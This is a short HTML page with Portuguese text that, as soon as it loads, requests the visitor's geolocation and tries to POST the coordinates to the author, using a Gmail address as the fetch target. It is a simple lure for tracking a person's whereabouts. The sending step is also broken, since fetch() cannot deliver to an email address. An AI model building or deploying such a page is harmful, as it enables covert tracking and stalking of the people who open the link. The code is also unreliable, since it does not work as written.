<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Location</title>
    <script>
        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Enviar para seu e-mail ou servidor
                    fetch("erison.a.cunha@gmail.com", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            latitude: latitude,
                            longitude: longitude
                        })
                    }).then(() => {
                        alert("Localização capturada!");
                    }).catch(() => {
                        alert("Erro ao enviar localização.");
                    });
                });
            } else {
                alert("Geolocalização não suportada neste dispositivo.");
            }
        }
    </script>
</head>
<body onload="captureLocation()">
    <h1>Capturando localização...</h1>
</body>
</html>
